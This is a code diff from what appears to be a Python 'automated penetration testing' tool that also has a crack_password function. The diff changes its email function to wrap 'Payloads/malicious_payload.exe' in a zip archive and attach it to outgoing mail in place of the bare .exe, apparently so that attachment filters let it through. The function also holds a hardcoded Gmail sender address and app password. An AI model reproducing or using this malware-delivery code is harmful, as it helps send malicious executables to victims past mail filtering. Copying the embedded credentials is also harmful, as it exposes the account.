@@ -8,6 +8,7 @@ from sqlite3 import Error
 import pyfiglet #pip install pyfiglet
 import os
 import csv
+import zipfile
 #import scrapy #pip install scrapy
 #from scrapy.spiders import CrawlSpider, Rule
 #from scrapy.linkextractors import LinkExtractor
@@ -2013,6 +2014,11 @@ def crack_password():
         conn.commit()
 
 def email():
+    my_zip = zipfile.ZipFile('payload.zip', 'w')
+
+    my_zip.write('Payloads/malicious_payload.exe')
+
+    my_zip.close()
     email_sender = 'automatedpenetrationtesting@gmail.com'
     email_password = 'sniczghgyrybspsh'
 
@@ -2029,9 +2035,9 @@ def email():
     em['Subject'] = subject
     em.set_content(body)
 
-    with open('Payloads/malicious_payload.exe', 'rb') as content_file:
+    with open('Payloads/payload.zip', 'rb') as content_file:
         content = content_file.read()
-        em.add_attachment(content, maintype='application', subtype='exe', filename='malicious_payload.exe')
+        em.add_attachment(content, maintype='application', subtype='zip', filename='payload.zip')
 
     context = ssl.create_default_context()
 
